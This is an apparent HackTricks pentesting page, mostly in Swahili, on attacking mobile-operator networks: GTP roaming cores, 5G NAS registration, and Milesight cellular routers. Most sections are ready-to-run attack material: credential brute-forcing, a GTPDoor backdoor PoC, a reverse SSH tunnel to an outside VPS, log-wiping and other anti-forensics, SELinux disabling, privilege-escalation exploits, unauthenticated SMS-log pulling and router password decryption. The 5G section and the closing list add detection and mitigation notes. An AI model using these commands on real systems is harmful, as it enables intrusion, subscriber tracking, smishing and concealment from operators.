# Utumiaji Mabaya wa Mtandao wa Telecom (GTP / Mazingira ya Roaming)

{{#include ../../banners/hacktricks-training.md}}

> [!NOTE]
> Itifaki za core za simu (GPRS Tunnelling Protocol – GTP) mara nyingi huvuka backbones za roaming za GRX/IPX ambazo hazijo kabisa kuaminika. Kwa kuwa zinabebwa juu ya UDP plain bila karibu uthibitisho wowote, **foothold yoyote ndani ya mpaka la telecom kwa kawaida inaweza kufikia core signalling planes moja kwa moja**. Vidokezo vifuatavyo vinakusanya mbinu za kushambulia zilizoshuhudiwa kwa SGSN/GGSN, PGW/SGW na nodes nyingine za EPC.

## 1. Recon & Initial Access

### 1.1  Default OSS / NE Accounts
Seti kubwa kwa kushangaza ya vipengele vya mtandao vya vendor huja na watumiaji wa SSH/Telnet walio hard-coded kama `root:admin`, `dbadmin:dbadmin`, `cacti:cacti`, `ftpuser:ftpuser`, …  wordlist maalum inaongeza kwa kiasi kikubwa mafanikio ya brute-force:
```bash
hydra -L usernames.txt -P vendor_telecom_defaults.txt ssh://10.10.10.10 -t 8 -o found.txt
```
Ikiwa kifaa kinatoa tu VRF ya usimamizi, pivot kupitia jump host kwanza (angalia sehemu «SGSN Emu Tunnel» hapa chini).

### 1.2  Host Discovery ndani ya GRX/IPX
Waendeshaji wengi wa GRX bado wanaruhusu **ICMP echo** kupitia backbone. Changanya `masscan` na `gtpv1` UDP probes zilizojengwa ndani ili kuunda ramani kwa haraka ya GTP-C listeners:
```bash
masscan 10.0.0.0/8 -pU:2123 --rate 50000 --router-ip 10.0.0.254 --router-mac 00:11:22:33:44:55
```
## 2. Kuorodhesha Wateja – `cordscan`

Chombo cha Go kilicho hapa kinaunda vifurushi vya **GTP-C Create PDP Context Request** na kinaweka kumbukumbu za majibu. Kila jibu linafunua **SGSN / MME** inayohudumia IMSI iliyoulizwa na, wakati mwingine, PLMN iliyotembelewa na mteja.
```bash
# Build
GOOS=linux GOARCH=amd64 go build -o cordscan ./cmd/cordscan

# Usage (typical):
./cordscan --imsi 404995112345678 --oper 40499 -w out.pcap
```
Bendera muhimu:
- `--imsi` IMSI ya mteja anayelengwa
- `--oper` Home / HNI (MCC+MNC)
- `-w`      Andika vifurushi mbichi kwenye pcap

Konstanti muhimu ndani ya binary zinaweza kupachikwa ili kupanua scans:
```
pingtimeout       = 3   // seconds before giving up
pco               = 0x218080
common_tcp_ports  = "22,23,80,443,8080"
```
## 3. Utekelezaji wa Msimbo juu ya GTP – `GTPDoor`

`GTPDoor` ni huduma ndogo ya ELF ambayo inasikiliza kwenye UDP 2123 na inachambua kila GTP-C packet inayokuja. Wakati payload inaanza na tag iliyoshirikiwa awali, sehemu iliyosalia inafumbuliwa (AES-128-CBC) na inatekelezwa kupitia `/bin/sh -c`. stdout/stderr zinexfiltrated ndani ya ujumbe za **Echo Response** ili hakuna session ya nje itakayoundwa.

Paketi ya PoC ndogo (Python):
```python
import gtpc, Crypto.Cipher.AES as AES
key = b"SixteenByteKey!"
cmd = b"id;uname -a"
enc = AES.new(key, AES.MODE_CBC, iv=b"\x00"*16).encrypt(cmd.ljust(32,b"\x00"))
print(gtpc.build_echo_req(tag=b"MAG1C", blob=enc))
```
Detection:
* mashine yoyote inayotuma **unbalanced Echo Requests** kwa IP za SGSN
* bendera ya toleo la GTP imewekwa kwa 1 wakati aina ya ujumbe = 1 (Echo) – utofauti na spec

## 4. Pivoting Through the Core

### 4.1  `sgsnemu` + SOCKS5
`OsmoGGSN` inaambatisha emulator ya SGSN inayoweza **kuanzisha PDP context kuelekea GGSN/PGW halisi**. Mara mazungumzo yanapokamilika, Linux inapokea kiolesura kipya `tun0` kinachoweza kufikiwa kutoka kwa mwenza wa roaming.
```bash
sgsnemu -g 10.1.1.100 -i 10.1.1.10 -m 40499 -s 404995112345678 \
-APN internet -c 1 -d
ip route add 172.16.0.0/12 dev tun0
microsocks -p 1080 &   # internal SOCKS proxy
```
Kwa firewall hair-pinning inayofaa, tuneli hii inapita kando ya signalling-only VLANs na inakupeleka moja kwa moja kwenye **data plane**.

### 4.2  SSH Reverse Tunnel over Port 53
DNS karibu kila mara huwa wazi katika miundombinu ya roaming. Fungua huduma ya ndani ya SSH kwenye VPS yako inayosikiliza kwenye :53 kisha rudi baadaye kutoka nyumbani:
```bash
ssh -f -N -R 0.0.0.0:53:127.0.0.1:22 user@vps.example.com
```
Thibitisha kwamba `GatewayPorts yes` imewezeshwa kwenye VPS.

## 5. Njia za siri

| Chaneli | Usafirishaji | Ufasiri | Maelezo |
|---------|-----------|----------|-------|
| ICMP – `EchoBackdoor` | ICMP Echo Req/Rep | 4-byte key + 14-byte chunks (XOR) | msikilizaji wa kimya kabisa, hakuna trafiki ya kutoka |
| DNS – `NoDepDNS` | UDP 53 | XOR (key = `funnyAndHappy`) encoded in A-record octets | huangalia sub-domain `*.nodep` |
| GTP – `GTPDoor` | UDP 2123 | AES-128-CBC blob in private IE | inajumuika na mazungumzo halali ya GTP-C chatter |

Implants zote zinaweka watchdogs ambazo **timestomp** binaries zao na re-spawn ikiwa zimeanguka.

## 6. Muhtasari wa Kuepukana na Ulinzi
```bash
# Remove attacker IPs from wtmp
utmpdump /var/log/wtmp | sed '/203\.0\.113\.66/d' | utmpdump -r > /tmp/clean && mv /tmp/clean /var/log/wtmp

# Disable bash history
export HISTFILE=/dev/null

# Masquerade as kernel thread
echo 0 > /proc/$$/autogroup   # hide from top/htop
printf '\0' > /proc/$$/comm    # appears as [kworker/1]

touch -r /usr/bin/time /usr/bin/chargen   # timestomp
setenforce 0                              # disable SELinux
```
## 7. Privilege Escalation kwenye Legacy NE
```bash
# DirtyCow – CVE-2016-5195
gcc -pthread dirty.c -o dirty && ./dirty /etc/passwd

# PwnKit – CVE-2021-4034
python3 PwnKit.py

# Sudo Baron Samedit – CVE-2021-3156
python3 exploit_userspec.py
```
Ushauri wa usafishaji:
```bash
userdel firefart 2>/dev/null
rm -f /tmp/sh ; history -c
```
## 8. Tool Box

* `cordscan`, `GTPDoor`, `EchoBackdoor`, `NoDepDNS` – custom tooling described in previous sections.
* `FScan` : intranet TCP sweeps (`fscan -p 22,80,443 10.0.0.0/24`)
* `Responder` : LLMNR/NBT-NS rogue WPAD
* `Microsocks` + `ProxyChains` : lightweight SOCKS5 pivoting
* `FRP` (≥0.37) : NAT traversal / asset bridging

## 9. 5G NAS Registration Attacks: SUCI leaks, downgrade to EEA0/EIA0, and NAS replay

Mchakato wa registration wa 5G unaendeshwa juu ya NAS (Non-Access Stratum) juu ya NGAP. Hadi usalama wa NAS hauwashwi kwa Security Mode Command/Complete, ujumbe za awali hazijathibitishwa na hazijaencrypt. Dirisha hili la kabla ya usalama linawezesha njia nyingi za attack wakati unaweza kuangalia au kubadilisha trafiki ya N2 (mfano, on-path ndani ya core, rogue gNB, au testbed).

Registration flow (simplified):
- Registration Request: UE inatuma SUCI (SUPI iliyosimbwa na home-network public key) na capabilities.
- Authentication: AMF/AUSF wanatuma RAND/AUTN; UE inarejesha RES*.
- Security Mode Command/Complete: integrity na ciphering za NAS zinajadiliwa na kuanzishwa.
- PDU Session Establishment: setup ya IP/QoS.

Lab setup tips (non-RF):
- Core: Open5GS default deployment inatosha kuzalisha flows.
- UE: simulator au test UE; decode kwa kutumia Wireshark.
- Active tooling: 5GReplay (capture/modify/replay NAS within NGAP), Sni5Gect (sniff/patch/inject NAS on the fly without bringing up a full rogue gNB).
- Useful display filters in Wireshark:
- ngap.procedure_code == 15 (InitialUEMessage)
- nas_5g.message_type == 65 or nas-5gs.message_type == 65 (Registration Request)

### 9.1 Identifier privacy: SUCI failures exposing SUPI/IMSI
Inayotarajiwa: UE/USIM lazima itume SUCI (SUPI iliyosimbwa na home-network public key). Kupata SUPI/IMSI kwa plaintext ndani ya Registration Request kunaonyesha hitilafu ya privacy inayoruhusu tracking ya subscriber kwa muda mrefu.

Jinsi ya kujaribu:
- Capture ujumbe wa kwanza wa NAS katika InitialUEMessage na inspect Mobile Identity IE.
- Wireshark quick checks:
- Inapaswa kudecode kama SUCI, sio IMSI.
- Filter examples: `nas-5gs.mobile_identity.suci || nas_5g.mobile_identity.suci` should exist; absence plus presence of `imsi` indicates leakage.

Kitu cha kukusanya:
- MCC/MNC/MSIN ikiwa imefunuliwa; log kwa kila-UE na track kwa wakati/mahali.

Mitigation:
- Lete enforcement ya SUCI-only UEs/USIMs; toa alert juu ya IMSI/SUPI yoyote katika initial NAS.

### 9.2 Capability bidding-down to null algorithms (EEA0/EIA0)
Background:
- UE inatangaza EEA (encryption) na EIA (integrity) zinazotambuliwa katika UE Security Capability IE ya Registration Request.
- Common mappings: EEA1/EIA1 = SNOW3G, EEA2/EIA2 = AES, EEA3/EIA3 = ZUC; EEA0/EIA0 ni null algorithms.

Issue:
- Kwa sababu Registration Request haina integrity protection, on-path attacker anaweza kufuta capability bits ili kulazimisha uchaguzi wa EEA0/EIA0 baadaye wakati wa Security Mode Command. Baadhi ya stacks zinakubali vibaya null algorithms hata nje ya huduma za dharura.

Offensive steps:
- Intercept InitialUEMessage na modify NAS UE Security Capability ili itangaze tu EEA0/EIA0.
- Kwa Sni5Gect, hook ujumbe wa NAS na patch capability bits kabla ya kuendelea mbele.
- Angalia kama AMF inakubali null ciphers/integrity na inakamilisha Security Mode kwa EEA0/EIA0.

Verification/visibility:
- Katika Wireshark, thibitisha algorithms zilizochaguliwa baada ya Security Mode Command/Complete.
- Example passive sniffer output:
```
Encyrption in use [EEA0]
Integrity in use [EIA0, EIA1, EIA2]
SUPI (MCC+MNC+MSIN) 9997000000001
```
Marekebisho (yanayohitajika):
- Sanidi AMF/policy kukataa EEA0/EIA0 isipokuwa pale panapobidiwa kwa ukali (kwa mfano, simu za dharura).
- Pendelea kutekeleza EEA2/EIA2 angalau; rekodi na toa tahadhari kwa muktadha wowote wa usalama wa NAS unaojadiliana null algorithms.

### 9.3 Replay of initial Registration Request (pre-security NAS)
Kwa sababu NAS ya awali haina uadilifu na freshness, InitialUEMessage+Registration Request zilizokamatwa zinaweza ku-replay kwa AMF.

PoC rule for 5GReplay to forward matching replays:
```xml
<beginning>
<property value="THEN"
property_id="101"
type_property="FORWARD"
description="Forward InitialUEMessage with Registration Request">

<!-- Trigger on NGAP InitialUEMessage (procedureCode == 15) -->
<event value="COMPUTE"
event_id="1"
description="Trigger: InitialUEMessage"
boolean_expression="ngap.procedure_code == 15"/>

<!-- Context match on NAS Registration Request (message_type == 65) -->
<event value="COMPUTE"
event_id="2"
description="Context: Registration Request"
boolean_expression="nas_5g.message_type == 65"/>

</property>
</beginning>
```
What to observe:
- Whether AMF accepts the replay and proceeds to Authentication; lack of freshness/context validation indicates exposure.
- Je, AMF inakubali replay na kuendelea na Authentication; ukosefu wa uhakiki wa freshness au binding ya muktadha unaashiria udhaifu.

Mitigations:
- Enforce replay protection/context binding at AMF; rate-limit and correlate per-GNB/UE.
- Tekeleza ulinzi dhidi ya replay na binding ya muktadha kwenye AMF; weka rate-limiting na uoanishaji kwa kila GNB/UE.

### 9.4 Tooling pointers (reproducible)
- Open5GS: spin up an AMF/SMF/UPF to emulate core; observe N2 (NGAP) and NAS.
- Open5GS: anzisha AMF/SMF/UPF ili kughushi core; angalia N2 (NGAP) na NAS.
- Wireshark: verify decodes of NGAP/NAS; apply the filters above to isolate Registration.
- Wireshark: thibitisha decodes za NGAP/NAS; tumia vichujio vilivyo hapo juu kutenganisha Registration.
- 5GReplay: capture a registration, then replay specific NGAP + NAS messages as per the rule.
- 5GReplay: rekodi Registration, kisha replay ujumbe maalum za NGAP + NAS kama ilivyoelezwa.
- Sni5Gect: live sniff/modify/inject NAS control-plane to coerce null algorithms or perturb authentication sequences.
- Sni5Gect: sniff/modify/inject kwa wakati halisi kwenye NAS control-plane ili kulazimisha null algorithms au kuyumbisha mfululizo wa authentication.

### 9.5 Defensive checklist
- Continuously inspect Registration Request for plaintext SUPI/IMSI; block offending devices/USIMs.
- Endelea kukagua Registration Request kwa SUPI/IMSI za plain text; zuia vifaa/USIMs vinavyokiuka.
- Reject EEA0/EIA0 except for narrowly defined emergency procedures; require at least EEA2/EIA2.
- Kataa EEA0/EIA0 isipokuwa kwa taratibu za dharura zilizoainishwa kwa undani mdogo; hitaji angalau EEA2/EIA2.
- Detect rogue or misconfigured infrastructure: unauthorized gNB/AMF, unexpected N2 peers.
- Tambua miundombinu ya rogue au iliyosanidiwa vibaya: gNB/AMF zisizoidhinishwa, N2 peers zisizotarajiwa.
- Alert on NAS security modes that result in null algorithms or frequent replays of InitialUEMessage.
- Toa onyo kwa NAS security modes zinazosababisha null algorithms au replay za mara kwa mara za InitialUEMessage.

---

## 10. Industrial Cellular Routers – Unauthenticated SMS API Abuse (Milesight UR5X/UR32/UR35/UR41) and Credential Recovery (CVE-2023-43261)

Abusing exposed web APIs of industrial cellular routers enables stealthy, carrier-origin smishing at scale. Milesight UR-series routers expose a JSON-RPC–style endpoint at `/cgi`. When misconfigured, the API can be queried without authentication to list SMS inbox/outbox and, in some deployments, to send SMS.
- Matumizi mabaya ya web APIs zilizo wazi za routers za cellular za viwandani yanawezesha smishing ya chanzo cha carrier kwa siri na kwa wingi. Routers za mfululizo wa Milesight UR zinaonyesha endpoint ya mtindo wa JSON-RPC kwenye `/cgi`. Wakati zinaposanidiwa vibaya, API inaweza kuhojiwa bila uthibitisho ili kuorodhesha SMS inbox/outbox na, katika baadhi ya usanidi, kutuma SMS.

Typical unauthenticated requests (same structure for inbox/outbox):
- Maombi ya kawaida yasiyo na uthibitisho (muundo ule ule kwa inbox/outbox):
```http
POST /cgi HTTP/1.1
Host: <router>
Content-Type: application/json

{ "base": "query_outbox", "function": "query_outbox", "values": [ {"page":1,"per_page":50} ] }
```

```json
{ "base": "query_inbox", "function": "query_inbox", "values": [ {"page":1,"per_page":50} ] }
```
Majibu yanajumuisha mashamba kama `timestamp`, `content`, `phone_number` (E.164), na `status` (`success` or `failed`). Kutumwa kwa `failed` mara kwa mara kwa nambari ile ile mara nyingi ni attacker “capability checks” ili kuthibitisha kuwa router/SIM inaweza kuwasilisha kabla ya blasting.

Mfano wa curl ku-exfiltrate SMS metadata:
```bash
curl -sk -X POST http://<router>/cgi \
-H 'Content-Type: application/json' \
-d '{"base":"query_outbox","function":"query_outbox","values":[{"page":1,"per_page":100}]}'
```
Vidokezo kuhusu auth artifacts:
- Baadhi ya trafiki inaweza kujumuisha auth cookie, lakini sehemu kubwa ya vifaa vilivyo wazi huwajibu bila authentication kwa `query_inbox`/`query_outbox` wakati management interface iko Internet-facing.
- Kwenye mazingira yanayohitaji auth, previously-leaked credentials (tazama chini) hurudisha access.

Credential recovery path – CVE-2023-43261:
- Familia zilizoathiriwa: UR5X, UR32L, UR32, UR35, UR41 (pre v35.3.0.7).
- Tatizo: web-served logs (e.g., `httpd.log`) zinapatikana unauthenticated chini ya `/lang/log/` na zina admin login events zenye password iliyo encrypted kwa kutumia hardcoded AES key/IV iliyopo client-side JavaScript.
- Practical access and decrypt:
```bash
curl -sk http://<router>/lang/log/httpd.log | sed -n '1,200p'
# Look for entries like: {"username":"admin","password":"<base64>"}
```
Mfano mdogo wa Python kwa decrypt leaked passwords (AES-128-CBC, hardcoded key/IV):
```python
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
KEY=b'1111111111111111'; IV=b'2222222222222222'
enc_b64='...'  # value from httpd.log
print(unpad(AES.new(KEY, AES.MODE_CBC, IV).decrypt(base64.b64decode(enc_b64)), AES.block_size).decode())
```
Mawazo ya kuwinda na kugundua (mtandao):
- Toa onyo kwa `POST /cgi` zisizothibitishwa ambazo mwili wa JSON una `base`/`function` umewekwa kuwa `query_inbox` au `query_outbox`.
- Fuata milipuko ya `POST /cgi` zinazojirudia zikifuatiwa na vigezo `status":"failed"` kwenye nambari nyingi za kipekee kutoka IP moja ya chanzo (capability testing).
- Fanya inventari ya Milesight routers zinazoweza kupatikana kutoka Internet; zuia usimamizi kwa VPN; zima vipengele vya SMS isipohitajika; sasisha hadi ≥ v35.3.0.7; rotate credentials na kagua SMS logs kwa unknown sends.

Shodan/OSINT pivots (mifano yaliyoshuhudiwa porini):
- `http.html:"rt_title"` inafanana na paneli za Milesight router.
- Google dorking kwa exposed logs: `"/lang/log/system" ext:log`.

Athari za kiutendaji: kutumia SIM halali za carrier ndani ya router kunatoa SMS deliverability/credibility ya juu sana kwa phishing, wakati inbox/outbox exposure leaks sensitive metadata at scale.

---

## Mawazo ya Ugunduzi
1. **Kifaa chochote isipokuwa SGSN/GGSN kinachoitisha Create PDP Context Requests**.
2. **Ports zisizo za kawaida (53, 80, 443) zikipokea SSH handshakes** kutoka IP za ndani.
3. **Echo Requests mara nyingi bila Echo Responses zinazolingana** – inaweza kuashiria GTPDoor beacons.
4. **Kiwango kikubwa cha trafiki ya ICMP echo-reply yenye identifier/sequence kubwa, zisizo sifuri**.
5. 5G: **InitialUEMessage inayobeba NAS Registration Requests zinazorudiwa kutoka endpoints sawa** (replay signal).
6. 5G: **NAS Security Mode ikijadili EEA0/EIA0** nje ya muktadha wa dharura.

## References

- [Palo Alto Unit42 – Infiltration of Global Telecom Networks](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- 3GPP TS 29.060 – GPRS Tunnelling Protocol (v16.4.0)
- 3GPP TS 29.281 – GTPv2-C (v17.6.0)
- [Demystifying 5G Security: Understanding the Registration Protocol](https://bishopfox.com/blog/demystifying-5g-security-understanding-the-registration-protocol)
- 3GPP TS 24.501 – Non-Access-Stratum (NAS) protocol for 5GS
- 3GPP TS 33.501 – Security architecture and procedures for 5G System
- [Silent Smishing: The Hidden Abuse of Cellular Router APIs (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [CVE-2023-43261 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-43261)
- [CVE-2023-43261 PoC (win3zz)](https://github.com/win3zz/CVE-2023-43261)

{{#include ../../banners/hacktricks-training.md}}
